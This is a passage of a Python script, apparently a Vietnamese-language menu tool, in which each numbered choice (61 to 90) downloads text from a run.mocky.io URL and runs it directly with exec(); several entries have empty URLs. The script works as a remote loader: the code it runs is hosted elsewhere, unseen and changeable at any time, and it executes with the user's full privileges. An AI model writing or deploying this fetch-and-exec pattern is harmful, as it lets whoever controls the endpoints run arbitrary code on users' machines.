	exec(requests.get('https://run.mocky.io/v3/d3a0c6e1-32ca-4f37-bea8-e6c47e6c4616').text)
if chon == 62 :
	exec(requests.get('https://run.mocky.io/v3/d3a0c6e1-32ca-4f37-bea8-e6c47e6c4616').text)
if chon == 63 :
	exec(requests.get('').text)
if chon == 64 :
	exec(requests.get('https://run.mocky.io/v3/47cf4ab5-412c-4693-8a0e-666f9ad4d8f3').text)
if chon == 65 :
	exec(requests.get('https://run.mocky.io/v3/409cf676-b5e5-4663-9585-ab42464312b5').text)
if chon == 66 :
	exec(requests.get('https://run.mocky.io/v3/943ce1ed-dad0-4d5a-ae95-2dd61ef4344b').text)
if chon == 67 :
	exec(requests.get('').text)
if chon == 68 :
	exec(requests.get('').text)
if chon == 69 :
	exec(requests.get('https://run.mocky.io/v3/d69364bd-0437-473b-95e4-0efafa42f849').text)
if chon == 70 :
	exec(requests.get('').text)
if chon == 71 :
	exec(requests.get('https://run.mocky.io/v3/b91e128c-5392-4ebe-9aea-97d928c158b0').text)
if chon == 72 :
	exec(requests.get('https://run.mocky.io/v3/a8aae68b-31c6-4c7d-be83-c1de78da094c').text)
if chon == 73 :
	exec(requests.get('https://run.mocky.io/v3/266f30c3-b000-48bb-b754-f4f03acb2b5c').text)
if chon == 74 :
	exec(requests.get('').text)
if chon == 75 :
	exec(requests.get('https://run.mocky.io/v3/b215716e-058d-463b-97bb-3ac4aec0bd64').text)
if chon == 76 :
	exec(requests.get('').text)
if chon == 77 :
	exec(requests.get('https://run.mocky.io/v3/2d01bf23-9f35-426b-ba4b-5a5cc32822a2').text)
if chon == 78 :
	exec(requests.get('https://run.mocky.io/v3/2ff47c2e-efc9-489a-9f5d-f3329b593ec7').text)
if chon == 79 :
	exec(requests.get('https://run.mocky.io/v3/1e6e35d7-d06b-43b5-b2a1-a179c5a4eadd').text)
if chon == 80 :
	exec(requests.get('').text)
if chon == 81 :
	exec(requests.get('https://run.mocky.io/v3/94c58d65-c07c-4bea-a5fd-fef4c877647a').text)
if chon == 82 :
	exec(requests.get('https://run.mocky.io/v3/5673805b-e8c6-479b-95c2-38059b792c19').text)
if chon == 83 :
	exec(requests.get('https://run.mocky.io/v3/e70f55a7-3311-47be-96fb-ab5b08cf2b36').text)
if chon == 84 :
	exec(requests.get('https://run.mocky.io/v3/6fd18acb-1d8d-4d39-b35c-38b91818762a').text)
if chon == 85 :
	exec(requests.get('https://run.mocky.io/v3/0651788f-2abe-44a0-aba7-bc452767eb27').text)
if chon == 86 :
	exec(requests.get('').text)
if chon == 87 :
	exec(requests.get('https://run.mocky.io/v3/6698f529-3ca4-40a2-996c-9640668f7180').text)
if chon == 88 :
	exec(requests.get('https://run.mocky.io/v3/990fcdb6-5d88-458d-a0d8-7881d098645e').text)
if chon == 89 :
	exec(requests.get('https://run.mocky.io/v3/e49a4d88-e2c0-4d83-ab43-4ba6a5aa890b').text)
if chon == 90 :
	exec(requests.get('').text)
	print (" Sai Lựa Chọn ")
	exit()
